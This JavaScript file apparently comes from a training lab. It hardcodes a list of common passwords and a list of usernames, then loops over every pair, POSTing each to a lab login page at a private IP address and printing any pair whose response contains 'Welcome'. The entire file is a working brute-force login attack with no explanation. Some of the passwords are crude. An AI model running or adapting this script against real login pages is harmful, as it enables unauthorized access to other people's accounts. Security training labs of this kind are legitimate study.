passwords = `amanda
bear
frank
brazil
baseball
wizard
tiger
hannah
lauren
master
xxxxxxxx
doctor
dave
japan
michael
money
gateway
eagle1
naked
football
phoenix
gators
11111
squirt
shadow
mickey
angel
mother
stars
monkey
bailey
junior
nathan
apple
abc123
knight
thx1138
raiders
alexis
pass
iceman
porno
steve
aaaa
fuckme
tigers
badboy
forever
bonnie`.split('\n');

usernames = `Elchen_2
el_chocle
ElChuckyneitor
ElCidCrafteador
elconin
ElConquistador
elcoolion
ElCorko
elcrafteur
El_Crafto   					
ElCrisco
ElCristo8
elCZstrickey
eld
elda
eldaelden
elDanXD
elda_oromis
eldar
eldenelder
eldenker
elder
Elder
Elder1
ElderAidsMage
Elderand
entitle
entity
entity0x
entity_303
Entity303
EntityBean
ento
ENTO22
entoan
entoblast
entoderm
entoil
entomb
entomo
entomologize
entomology
entomophagous
entomophilous
entomostracan
EnToony
entophyte
entopic
entourage
entozoic
entozoon
entr
entrails
entrain
entrammel
entrance
EntrancedCape5
entranceway
entrant
entrap
entreat
entreaty
entrechat
entree
gastrin
gastritis
gastro
gastrocnemius
gastroenteritis
gastroenterology
gastroenterostomy
gastrointestinal
gastrolith
gastrolizard
gastrology
Gastronam
gastronome
gastronomy
gastropod
gastroscope
gastrostomy
gastrotomy
gastrotrich
gastrovascular
gastrula
gastrulation
gasts
gasttest
gastuser
Gasuros
gasworks
Gasyboy
Gasymexican
gat
Gatanater
Gatchi`.split('\n');

const form = document.getElementsByName('login')[0];
const usernameField = document.getElementsByName('username')[0];
const passwordField = document.getElementsByName('password')[0];
const correct = {};
url = 'http://192.168.64.3/Decamp/Chapter6/lab1/login.php';

for (let i = 0; i < usernames.length; i++) {
  for (let j = 0; j < passwords.length; j++) {
    fd = new FormData();

    data = {
      username: usernames[i],
      password: passwords[j],
      submit: 'Login',
    };

    for (const [name, value] of Object.entries(data)) {
      fd.append(name, value);
    }

    try {
      const response = await fetch(url, {
        method: 'POST',
        body: fd,
      });

      const responseData = await response.text();
      // console.log(responseData);
      if (responseData.includes('Welcome')) {
        console.log('Login credentials:');
        console.log(data.username, data.password);
      } else {
        console.log('.');
      }
    } catch (error) {
      console.error(error);
    }
  }
}
